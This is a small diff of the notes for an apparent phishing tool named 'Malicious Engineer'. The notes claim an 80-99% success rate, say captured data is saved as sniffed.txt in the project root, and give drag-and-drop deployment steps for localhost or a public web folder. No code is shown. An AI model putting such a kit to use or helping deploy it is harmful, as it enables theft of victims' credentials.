@@ -2,7 +2,7 @@
 #---------------------- PROGRAM NOTES ------------------------->
 # use iframe only if the site doesn't load or if css is messed up.
 # Malicious Engineer has a 80 - 99% success rate
-
+# info will be stored as sniffed.txt inside the projects root folder.
 
 Drag Drop and Deploy
 Just put this folder in your localhost or upload it to your public html folder 
